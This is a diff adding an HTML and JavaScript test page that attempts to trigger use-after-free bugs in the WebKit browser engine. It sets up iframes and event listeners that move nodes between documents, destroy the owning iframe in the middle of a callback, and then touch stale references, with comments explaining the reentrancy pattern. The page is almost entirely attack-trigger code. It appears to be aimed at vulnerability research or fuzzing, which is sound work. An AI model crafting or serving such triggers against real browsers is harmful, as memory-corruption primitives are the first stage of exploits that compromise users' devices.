@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>WebKit UAF Lifecycle Reentrancy V1</title>
+
+<style>
+/* RenderTree / style-state pressure, kept moderate */
+#stage {
+    position: relative;
+    width: 420px;
+    min-height: 180px;
+    overflow: auto;
+    contain: layout;
+}
+
+.branch {
+    position: relative;
+    display: block;
+    overflow: hidden;
+    transform: translateZ(0);
+    contain: layout paint;
+}
+
+.branch:nth-child(odd) {
+    writing-mode: horizontal-tb;
+    direction: ltr;
+}
+
+.branch:nth-child(even) {
+    writing-mode: horizontal-tb;
+    direction: rtl;
+}
+
+.probe {
+    display: block;
+    position: relative;
+    min-height: 18px;
+    margin: 2px;
+    padding: 2px;
+    overflow: hidden;
+}
+
+.focusable:focus {
+    outline: 1px solid;
+}
+
+@media (min-width: 1px) {
+    .probe { text-overflow: ellipsis; }
+}
+</style>
+</head>
+
+<body>
+<div id="stage">
+    <div class="branch" id="branchA">
+        <div class="probe" id="probeA" tabindex="0">A</div>
+        <div class="probe">A1</div>
+        <div class="probe">A2</div>
+    </div>
+
+    <div class="branch" id="branchB">
+        <div class="probe" id="probeB" tabindex="0">B</div>
+        <div class="probe">B1</div>
+        <div class="probe">B2</div>
+    </div>
+</div>
+
+<iframe id="frameA" name="frameA"
+        style="width:320px;height:110px;border:0"
+        srcdoc='<!doctype html>
+<html>
+<head>
+<style>
+html,body{margin:0;padding:0}
+#root{
+    position:relative;
+    overflow:auto;
+    contain:layout;
+    width:280px;
+    height:90px;
+}
+.item{
+    position:relative;
+    display:block;
+    min-height:14px;
+    margin:1px;
+    padding:2px;
+    transform:translateZ(0);
+}
+.item:nth-child(odd){direction:ltr}
+.item:nth-child(even){direction:rtl}
+</style>
+</head>
+<body>
+<div id="root">
+    <div class="item" id="item0" tabindex="0">frame A 0</div>
+    <div class="item" id="item1">frame A 1</div>
+    <div class="item" id="item2">frame A 2</div>
+    <div class="item" id="item3">frame A 3</div>
+</div>
+</body>
+</html>'>
+</iframe>
+
+<iframe id="frameB" name="frameB"
+        style="width:320px;height:110px;border:0"
+        srcdoc='<!doctype html>
+<html>
+<head>
+<style>
+html,body{margin:0;padding:0}
+#root{
+    position:relative;
+    overflow:auto;
+    contain:layout;
+    width:280px;
+    height:90px;
+}
+.item{
+    position:relative;
+    display:block;
+    min-height:14px;
+    margin:1px;
+    padding:2px;
+    transform:translateZ(0);
+}
+.item:nth-child(odd){direction:ltr}
+.item:nth-child(even){direction:rtl}
+</style>
+</head>
+<body>
+<div id="root">
+    <div class="item" id="item0" tabindex="0">frame B 0</div>
+    <div class="item" id="item1">frame B 1</div>
+    <div class="item" id="item2">frame B 2</div>
+    <div class="item" id="item3">frame B 3</div>
+</div>
+</body>
+</html>'>
+</iframe>
+
+<script>
+(function () {
+    "use strict";
+
+    var frameA = document.getElementById("frameA");
+    var frameB = document.getElementById("frameB");
+    var branchA = document.getElementById("branchA");
+    var branchB = document.getElementById("branchB");
+    var probeA = document.getElementById("probeA");
+    var probeB = document.getElementById("probeB");
+
+    /*
+     * The important pattern here is not generic stress:
+     *
+     *   callback begins
+     *      -> cross-document mutation/adoption
+     *      -> owner/iframe destruction
+     *      -> style/layout invalidation
+     *      -> callback resumes
+     *
+     * This intentionally keeps GC out of the hot path.
+     */
+
+    function forceLayout(doc, node) {
+        try {
+            if (node)
+                void node.offsetHeight;
+            if (doc && doc.body)
+                void doc.body.offsetWidth;
+        } catch (_) {}
+    }
+
+    function moderateGCPressure() {
+        /*
+         * Small allocation burst only. This is deliberately much lighter
+         * than repeatedly running a full LayoutTest gc() helper.
+         */
+        var a = [];
+        for (var i = 0; i < 180; ++i)
+            a.push({x: i, s: "webkit-uaf-" + i});
+        a.length = 0;
+    }
+
+    function armFrame(frame, branch, probe) {
+        var win, doc, root, item, staleRoot, staleItem;
+        try {
+            win = frame.contentWindow;
+            doc = frame.contentDocument;
+            if (!doc || !doc.body)
+                return;
+
+            root = doc.getElementById("root");
+            item = doc.getElementById("item0");
+            staleRoot = root;
+            staleItem = item;
+
+            forceLayout(doc, root);
+
+            /*
+             * EventTarget-style reentrancy:
+             * dispatching a custom event enters user callback, where the
+             * callback mutates ownership of a node and then destroys the
+             * iframe that owns the remaining state.
+             */
+            root.addEventListener("uafprobe", function firstListener() {
+                try {
+                    if (item && branch)
+                        branch.appendChild(item);
+
+                    if (probe) {
+                        probe.classList.toggle("focusable");
+                        probe.setAttribute("data-state", "changed");
+                    }
+
+                    forceLayout(document, branch);
+
+                    /*
+                     * Destroy the document owner after adoption/mutation.
+                     */
+                    frame.remove();
+
+                    /*
+                     * The callback deliberately retains old references and
+                     * touches them after owner destruction.
+                     */
+                    forceLayout(doc, staleRoot);
+
+                    if (staleItem) {
+                        staleItem.classList.toggle("after-destroy");
+                        staleItem.textContent = "retained";
+                    }
+                } catch (_) {}
+            }, false);
+
+            /*
+             * Second listener creates propagation/reentrancy pressure:
+             * the first listener has already changed the tree and ownership.
+             */
+            root.addEventListener("uafprobe", function secondListener() {
+                try {
+                    if (staleRoot)
+                        forceLayout(doc, staleRoot);
+
+                    if (staleItem)
+                        staleItem.getBoundingClientRect();
+
+                    moderateGCPressure();
+                } catch (_) {}
+            }, false);
+
+            /*
+             * SVG/resource-like dependency analogue:
+             * stylesheet state is changed while the document is in transition.
+             */
+            if (doc.head) {
+                var style = doc.createElement("style");
+                style.textContent =
+                    ".late{display:block;position:relative;overflow:hidden;" +
+                    "transform:translateZ(0);contain:layout}" +
+                    ".late:first-child{direction:rtl}";
+                doc.head.appendChild(style);
+
+                forceLayout(doc, root);
+
+                setTimeout(function () {
+                    try {
+                        style.remove();
+
+                        if (staleRoot) {
+                            staleRoot.className = "late";
+                            forceLayout(doc, staleRoot);
+                        }
+                    } catch (_) {}
+                }, 0);
+            }
+
+            /*
+             * Dispatch only after all listeners and lifecycle state are ready.
+             */
+            setTimeout(function () {
+                try {
+                    if (staleRoot)
+                        staleRoot.dispatchEvent(new Event("uafprobe", {
+                            bubbles: true,
+                            cancelable: true
+                        }));
+                } catch (_) {}
+            }, 0);
+
+        } catch (_) {}
+    }
+
+    /*
+     * Cross-document adoption variant.
+     * A node originating in frame A is adopted into the top document while
+     * frame A is simultaneously entering destruction.
+     */
+    function crossDocumentAdoption() {
+        var docA, rootA, itemA, holder;
+
+        try {
+            docA = frameA.contentDocument;
+            if (!docA)
+                return;
+
+            rootA = docA.getElementById("root");
+            itemA = docA.getElementById("item1");
+
+            if (!rootA || !itemA)
+                return;
+
+            holder = document.createElement("div");
+            holder.className = "branch";
+            document.getElementById("stage").appendChild(holder);
+
+            forceLayout(docA, rootA);
+
+            rootA.addEventListener("adoptprobe", function () {
+                try {
+                    holder.appendChild(document.adoptNode(itemA));
+
+                    branchB.classList.toggle("probe-state");
+                    forceLayout(document, holder);
+
+                    frameA.remove();
+
+                    /*
+                     * Retained references survive the owner transition.
+                     */
+                    itemA.classList.toggle("retained");
+                    holder.offsetHeight;
+                    forceLayout(docA, rootA);
+                } catch (_) {}
+            }, false);
+
+            setTimeout(function () {
+                try {
+                    rootA.dispatchEvent(new Event("adoptprobe"));
+                } catch (_) {}
+            }, 5);
+
+        } catch (_) {}
+    }
+
+    /*
+     * RenderTree/style reentrancy variant:
+     * mutation starts while a frame callback is active, then the frame is
+     * detached and the callback resumes against retained render state.
+     */
+    function renderTreeReentry() {
+        var docB, rootB, itemB, styleB;
+
+        try {
+            docB = frameB.contentDocument;
+            if (!docB)
+                return;
+
+            rootB = docB.getElementById("root");
+            itemB = docB.getElementById("item2");
+
+            styleB = docB.createElement("style");
+            styleB.textContent =
+                "#root{column-count:1;column-gap:3px}" +
+                ".reentry{position:relative;overflow:hidden;" +
+                "writing-mode:horizontal-tb;transform:translateZ(0)}";
+            docB.head.appendChild(styleB);
+
+            forceLayout(docB, rootB);
+
+            rootB.addEventListener("styleprobe", function () {
+                try {
+                    itemB.className = "item reentry";
+                    rootB.style.display = "block";
+                    forceLayout(docB, rootB);
+
+                    styleB.remove();
+
+                    /*
+                     * Remove the owner after render/style invalidation.
+                     */
+                    frameB.remove();
+
+                    /*
+                     * Resume with retained references.
+                     */
+                    rootB.style.position = "relative";
+                    itemB.getBoundingClientRect();
+                    forceLayout(docB, rootB);
+                } catch (_) {}
+            }, false);
+
+            setTimeout(function () {
+                try {
+                    rootB.dispatchEvent(new Event("styleprobe"));
+                } catch (_) {}
+            }, 10);
+
+        } catch (_) {}
+    }
+
+    /*
+     * Fullscreen is intentionally not used as the primary trigger here.
+     * Focus is also secondary. The core is iframe lifecycle + reentrancy.
+     */
+    function start() {
+        try {
+            forceLayout(document, document.getElementById("stage"));
+            armFrame(frameA, branchA, probeA);
+            armFrame(frameB, branchB, probeB);
+
+            setTimeout(crossDocumentAdoption, 25);
+            setTimeout(renderTreeReentry, 40);
+
+            /*
+             * One light lifecycle mutation in the top document.
+             */
+            setTimeout(function () {
+                try {
+                    branchA.classList.toggle("layout-state");
+                    void branchA.offsetHeight;
+
+                    var moved = document.createElement("div");
+                    moved.className = "probe";
+                    moved.textContent = "lifecycle";
+                    branchA.appendChild(moved);
+
+                    void moved.offsetHeight;
+
+                    branchA.removeChild(moved);
+                    branchB.appendChild(moved);
+
+                    void moved.offsetHeight;
+                } catch (_) {}
+            }, 70);
+
+        } catch (_) {}
+    }
+
+    if (document.readyState === "loading")
+        window.addEventListener("load", start, { once: true });
+    else
+        start();
+
+})();
+</script>
+</body>
+</html>
